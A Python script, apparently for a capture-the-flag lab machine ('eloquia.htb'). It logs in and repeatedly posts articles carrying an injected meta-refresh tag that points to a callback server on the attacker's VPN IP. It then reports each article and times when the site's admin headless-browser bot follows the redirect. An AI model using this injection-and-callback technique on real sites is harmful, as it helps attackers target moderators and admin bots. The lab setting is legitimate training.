#!/usr/bin/env python3
"""
bot_timing.py - Estimate admin bot visit timing (continuous mode)

Creates articles continuously in background thread, reconciles callbacks
in foreground, prints running stats. Runs until Ctrl+C.

Usage:
    python3 bot_timing.py                  # Create article every 10s (default)
    python3 bot_timing.py --interval 5     # Create article every 5s
    python3 bot_timing.py --analyze        # Just analyze existing data
"""

import requests
import subprocess
import threading
import argparse
import random
import time
import json
import sys
import os
import re
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
from io import BytesIO
from urllib.parse import parse_qs, urlparse
from collections import deque

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TMP_DIR = os.path.join(SCRIPT_DIR, "tmp")
TIMING_FILE = os.path.join(TMP_DIR, "bot_timing.json")

TARGET_ELOQUIA = "http://eloquia.htb"

CAPTURE_PORT = 8888
CAPTURE_PORT_RETRIES = 10

# Global debug flag (set by --debug)
DEBUG = False

class C:
    G = '\033[92m'
    Y = '\033[93m'
    R = '\033[91m'
    C = '\033[96m'
    M = '\033[95m'
    B = '\033[1m'
    DIM = '\033[2m'
    X = '\033[0m'

def get_csrf(html):
    match = re.search(r'csrfmiddlewaretoken" value="([^"]+)"', html)
    return match.group(1) if match else None

def get_tun0_ip():
    try:
        result = subprocess.run(['ip', 'addr', 'show', 'tun0'],
                              capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'inet ' in line:
                return line.split()[1].split('/')[0]
    except:
        pass
    return None

def load_credentials():
    try:
        with open(os.path.join(TMP_DIR, "username.txt")) as f:
            username = f.read().strip()
        with open(os.path.join(TMP_DIR, "password.txt")) as f:
            password = f.read().strip()
        return username, password
    except:
        return None, None

def create_banner_image():
    try:
        from PIL import Image
        img = Image.new('RGB', (200, 150))
        for i in range(200):
            for j in range(150):
                img.putpixel((i, j), (random.randint(0,255), random.randint(0,255), random.randint(0,255)))
        buf = BytesIO()
        img.save(buf, 'PNG')
        buf.seek(0)
        return buf
    except ImportError:
        print(f"{C.R}[-] PIL not installed. Run: pip install Pillow{C.X}")
        sys.exit(1)

def load_timing_data():
    if os.path.exists(TIMING_FILE):
        try:
            with open(TIMING_FILE) as f:
                return json.load(f)
        except:
            pass
    return {"visits": [], "intervals": []}

def save_timing_data(data):
    os.makedirs(TMP_DIR, exist_ok=True)
    with open(TIMING_FILE, "w") as f:
        json.dump(data, f, indent=2)


class Stats:
    """Thread-safe statistics tracker"""

    def __init__(self):
        self.lock = threading.Lock()
        self.elapsed_times = []
        self.intervals = []
        self.last_visit_time = None
        self.articles_created = 0
        self.articles_visited = 0
        self.pending = {}  # ts -> {article_id, created_at}

    def add_pending(self, ts, article_id, created_at):
        with self.lock:
            self.pending[ts] = {"article_id": article_id, "created_at": created_at}
            self.articles_created += 1

    def record_visit(self, ts, visit_time):
        with self.lock:
            if ts not in self.pending:
                return None

            info = self.pending[ts]
            elapsed = int(visit_time - info["created_at"])
            self.elapsed_times.append(elapsed)
            self.articles_visited += 1

            # Calculate interval
            interval = None
            if self.last_visit_time:
                interval = int(visit_time - self.last_visit_time)
                self.intervals.append(interval)
            self.last_visit_time = visit_time

            del self.pending[ts]

            return {
                "article_id": info["article_id"],
                "elapsed": elapsed,
                "interval": interval
            }

    def get_stats(self):
        with self.lock:
            if not self.elapsed_times:
                return None
            return {
                "created": self.articles_created,
                "visited": self.articles_visited,
                "pending": len(self.pending),
                "elapsed_min": min(self.elapsed_times),
                "elapsed_max": max(self.elapsed_times),
                "elapsed_avg": sum(self.elapsed_times) / len(self.elapsed_times),
                "interval_min": min(self.intervals) if self.intervals else None,
                "interval_max": max(self.intervals) if self.intervals else None,
                "interval_avg": sum(self.intervals) / len(self.intervals) if self.intervals else None,
            }

    def to_data(self):
        """Convert to save format"""
        with self.lock:
            return {
                "visits": [{"elapsed": e} for e in self.elapsed_times],
                "intervals": self.intervals
            }


class CaptureServer:
    """HTTP server to capture bot callbacks"""

    def __init__(self, port, stats):
        self.port = port
        self.stats = stats
        self.server = None
        self.thread = None

    def start(self):
        handler = self._create_handler()
        self.server = HTTPServer(('0.0.0.0', self.port), handler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()

    def stop(self):
        if self.server:
            self.server.shutdown()

    def _create_handler(self):
        stats = self.stats

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass

            def handle(self):
                """Override to suppress connection reset errors"""
                try:
                    super().handle()
                except (ConnectionResetError, BrokenPipeError):
                    pass  # Bot closed connection - normal behavior

            def do_GET(self):
                user_agent = self.headers.get('User-Agent', '')
                is_bot = 'HeadlessChrome' in user_agent

                # Debug: log ALL incoming requests
                if DEBUG:
                    print(f"\n{C.M}[DEBUG] << Request: {self.path}")
                    print(f"[DEBUG]    From: {self.client_address[0]}")
                    print(f"[DEBUG]    UA: {user_agent[:70]}")
                    print(f"[DEBUG]    is_bot={is_bot}{C.X}")

                if '/timing_test' in self.path:
                    parsed = urlparse(self.path)
                    params = parse_qs(parsed.query)
                    if 'ts' in params:
                        ts = params['ts'][0]
                        visit_time = time.time()

                        # Debug: check if ts is in pending
                        if DEBUG and ts not in stats.pending:
                            print(f"{C.M}[DEBUG]    ts={ts} NOT in pending (stale article?){C.X}")

                        if is_bot:
                            result = stats.record_visit(ts, visit_time)
                            if result:
                                print_callback(result, stats.get_stats())
                        elif DEBUG:
                            print(f"{C.M}[DEBUG]    Skipped - not a bot User-Agent{C.X}")

                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(b'OK')

        return Handler


def print_callback(result, current_stats):
    """Print callback info and running stats"""
    print(f"\r{' '*80}\r", end='')  # Clear line

    # Callback info
    interval_str = f", interval: {result['interval']}s" if result['interval'] else ""
    print(f"{C.G}[CALLBACK]{C.X} Article {result['article_id']}: elapsed {result['elapsed']}s{interval_str}")

    # Running stats
    if current_stats:
        print(f"{C.DIM}  Stats: {current_stats['visited']}/{current_stats['created']} visited | "
              f"elapsed: {current_stats['elapsed_min']}-{current_stats['elapsed_max']}s "
              f"(avg {current_stats['elapsed_avg']:.1f}s)", end='')
        if current_stats['interval_avg']:
            print(f" | interval avg: {current_stats['interval_avg']:.1f}s{C.X}")
        else:
            print(f"{C.X}")


def print_status(stats, next_create_in):
    """Print periodic status update"""
    s = stats.get_stats()
    pending = len(stats.pending)
    created = stats.articles_created
    visited = stats.articles_visited

    status = f"{C.C}[STATUS]{C.X} Created: {created} | Visited: {visited} | Pending: {pending}"
    if next_create_in > 0:
        status += f" | Next article in: {next_create_in}s"
    print(f"\r{status}  ", end='', flush=True)


class ArticleCreator:
    """Background thread that creates articles at regular intervals"""

    def __init__(self, username, password, callback_ip, port, interval, stats):
        self.username = username
        self.password = password
        self.callback_ip = callback_ip
        self.port = port
        self.interval = interval
        self.stats = stats
        self.running = True
        self.thread = None
        self.session = None
        self.article_num = 0

    def start(self):
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()

    def stop(self):
        self.running = False

    def _login(self):
        """Login and return session"""
        session = requests.Session()
        login_page = session.get(f"{TARGET_ELOQUIA}/accounts/login/", timeout=30)
        csrf = get_csrf(login_page.text)
        session.post(f"{TARGET_ELOQUIA}/accounts/login/",
            data={
                'csrfmiddlewaretoken': csrf,
                'username': self.username,
                'password': self.password
            },
            headers={'Referer': f"{TARGET_ELOQUIA}/accounts/login/"},
            timeout=30
        )
        if 'sessionid' in session.cookies:
            return session
        return None

    def _create_article(self):
        """Create a single test article"""
        if not self.session or 'sessionid' not in self.session.cookies:
            self.session = self._login()
            if not self.session:
                print(f"\r{C.R}[ERROR] Login failed{C.X}                    ")
                return False

        self.article_num += 1
        timestamp = str(int(time.time()))
        test_url = f"http://{self.callback_ip}:{self.port}/timing_test?ts={timestamp}&n={self.article_num}"

        # Debug: show callback URL
        if DEBUG:
            print(f"{C.M}[DEBUG] >> Callback URL: {test_url}{C.X}")

        try:
            create_page = self.session.get(f"{TARGET_ELOQUIA}/article/create/", timeout=30)
            csrf = get_csrf(create_page.text)

            if not csrf:
                # Session expired, re-login
                self.session = self._login()
                if not self.session:
                    return False
                create_page = self.session.get(f"{TARGET_ELOQUIA}/article/create/", timeout=30)
                csrf = get_csrf(create_page.text)

            content = f'<meta http-equiv="refresh" content="0;url={test_url}"><p>Timing test {self.article_num}</p>'

            my_articles = self.session.get(f"{TARGET_ELOQUIA}/article/mine/", timeout=30)
            existing_ids = set(re.findall(r'article/visit/(\d+)', my_articles.text))

            resp = self.session.post(f"{TARGET_ELOQUIA}/article/create/",
                data={
                    'csrfmiddlewaretoken': csrf,
                    'title': f"Timing Test {timestamp}",
                    'content': content
                },
                files={'banner': ('banner.png', create_banner_image(), 'image/png')},
                headers={'Referer': f"{TARGET_ELOQUIA}/article/create/"},
                timeout=60
            )

            # Find article ID
            article_id = None
            match = re.search(r'article/visit/(\d+)', resp.url + resp.text)
            if match:
                article_id = match.group(1)
            else:
                my_articles = self.session.get(f"{TARGET_ELOQUIA}/article/mine/", timeout=30)
                new_ids = set(re.findall(r'article/visit/(\d+)', my_articles.text))
                created = new_ids - existing_ids
                if created:
                    article_id = max(created)

            if not article_id:
                print(f"\r{C.R}[ERROR] Failed to create article{C.X}              ")
                return False

            # Report article
            self.session.get(f"{TARGET_ELOQUIA}/article/report/{article_id}/", timeout=30)

            # Track it
            self.stats.add_pending(timestamp, article_id, int(timestamp))

            print(f"\r{C.Y}[CREATED]{C.X} Article {article_id} (#{self.article_num}) - waiting for bot...       ")
            return True

        except requests.RequestException as e:
            print(f"\r{C.R}[ERROR] Request failed: {e}{C.X}              ")
            self.session = None  # Force re-login
            return False

    def _run(self):
        """Main loop - create articles at interval"""
        while self.running:
            self._create_article()

            # Sleep in small increments so we can stop quickly
            for _ in range(self.interval * 2):
                if not self.running:
                    break
                time.sleep(0.5)


def print_summary(stats):
    """Print final summary"""
    s = stats.get_stats()

    print(f"\n\n{C.C}{C.B}{'='*60}{C.X}")
    print(f"{C.C}{C.B}  TIMING SUMMARY{C.X}")
    print(f"{C.C}{C.B}{'='*60}{C.X}\n")

    if not s:
        print("  No data collected.")
        return

    print(f"  Articles created:  {s['created']}")
    print(f"  Articles visited:  {s['visited']}")
    print(f"  Still pending:     {s['pending']}")

    print(f"\n  {C.Y}Elapsed time (creation -> bot visit):{C.X}")
    print(f"    Min: {s['elapsed_min']}s")
    print(f"    Max: {s['elapsed_max']}s")
    print(f"    Avg: {s['elapsed_avg']:.1f}s")

    if s['interval_avg']:
        print(f"\n  {C.Y}Interval between bot visits:{C.X}")
        print(f"    Min: {s['interval_min']}s")
        print(f"    Max: {s['interval_max']}s")
        print(f"    Avg: {s['interval_avg']:.1f}s")

        print(f"\n  {C.G}Recommended --bot-interval: {int(s['interval_avg'])}{C.X}")

    print(f"\n{C.C}{'='*60}{C.X}\n")


def analyze_existing():
    """Analyze existing timing data"""
    data = load_timing_data()

    print(f"\n{C.C}{C.B}--- TIMING ANALYSIS ---{C.X}")

    visits = data.get("visits", [])
    if not visits:
        print("  No timing data collected yet.")
        return

    print(f"  Total samples: {len(visits)}")

    elapsed_times = [v["elapsed"] for v in visits if "elapsed" in v]
    if elapsed_times:
        print(f"\n  Elapsed time (creation -> visit):")
        print(f"    Min: {min(elapsed_times)}s")
        print(f"    Max: {max(elapsed_times)}s")
        print(f"    Avg: {sum(elapsed_times)/len(elapsed_times):.1f}s")

    intervals = data.get("intervals", [])
    if intervals:
        print(f"\n  Interval between visits:")
        print(f"    Min: {min(intervals)}s")
        print(f"    Max: {max(intervals)}s")
        print(f"    Avg: {sum(intervals)/len(intervals):.1f}s")
        print(f"\n  {C.G}Recommended --bot-interval: {int(sum(intervals)/len(intervals))}{C.X}")


def main():
    parser = argparse.ArgumentParser(description='Estimate admin bot timing (continuous)')
    parser.add_argument('--interval', type=int, default=10,
                        help='Seconds between article creation (default: 10)')
    parser.add_argument('--analyze', action='store_true',
                        help='Only analyze existing data, no new tests')
    parser.add_argument('--port', type=int, default=CAPTURE_PORT,
                        help=f'Capture server port (default: {CAPTURE_PORT})')
    parser.add_argument('--keep', action='store_true',
                        help='Keep existing timing data (default: clear on start)')
    parser.add_argument('--debug', action='store_true',
                        help='Enable debug logging for all HTTP requests')
    args = parser.parse_args()

    # Set global debug flag
    global DEBUG
    DEBUG = args.debug

    print(f"\n{C.C}{C.B}BOT TIMING ESTIMATOR (Continuous){C.X}")
    print(f"{C.C}{'='*50}{C.X}")

    if not args.keep and not args.analyze:
        save_timing_data({"visits": [], "intervals": []})
        print(f"  Cleared previous timing data")

    if args.analyze:
        analyze_existing()
        return

    # Check prerequisites
    username, password = load_credentials()
    if not username:
        print(f"{C.R}[-] No credentials found in tmp/username.txt{C.X}")
        sys.exit(1)

    callback_ip = get_tun0_ip()
    if not callback_ip:
        print(f"{C.R}[-] Could not get tun0 IP. Check VPN connection.{C.X}")
        sys.exit(1)

    print(f"  User: {username}")
    print(f"  Callback IP: {callback_ip}")
    print(f"  Article interval: {args.interval}s")
    if DEBUG:
        print(f"  {C.M}Debug mode: ENABLED{C.X}")
    print(f"\n  {C.Y}Press Ctrl+C to stop and see summary{C.X}\n")

    # Initialize stats
    stats = Stats()

    # Start capture server
    server = None
    actual_port = None

    for offset in range(CAPTURE_PORT_RETRIES):
        try_port = args.port + offset
        try:
            server = CaptureServer(try_port, stats)
            server.start()
            actual_port = try_port
            print(f"  {C.G}Capture server on port {actual_port}{C.X}")
            print(f"  {C.G}Callbacks: http://{callback_ip}:{actual_port}/timing_test?...{C.X}")
            break
        except OSError:
            continue

    if not server:
        print(f"{C.R}[-] Could not start capture server{C.X}")
        sys.exit(1)

    # Start article creator thread
    creator = ArticleCreator(username, password, callback_ip, actual_port, args.interval, stats)
    creator.start()
    print(f"  {C.G}Article creator started (every {args.interval}s){C.X}\n")

    # Main loop - show elapsed time, wait for Ctrl+C
    start_time = time.time()
    try:
        while True:
            elapsed = int(time.time() - start_time)
            mins, secs = divmod(elapsed, 60)
            s = stats.get_stats()
            pending = len(stats.pending)
            visited = stats.articles_visited
            created = stats.articles_created

            status = f"{C.DIM}[{mins:02d}:{secs:02d}] Created: {created} | Visited: {visited} | Pending: {pending}"
            if s and s['elapsed_avg']:
                status += f" | Avg elapsed: {s['elapsed_avg']:.0f}s"
            if s and s['interval_avg']:
                status += f" | Avg interval: {s['interval_avg']:.0f}s"
            status += f"{C.X}"

            print(f"\r{status}    ", end='', flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        pass

    # Cleanup
    print(f"\n\n{C.Y}[!] Stopping...{C.X}")
    creator.stop()
    server.stop()

    # Save data
    save_timing_data(stats.to_data())
    print(f"  Data saved to: {TIMING_FILE}")

    # Print summary
    print_summary(stats)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.Y}[!] Interrupted{C.X}")
        sys.exit(1)
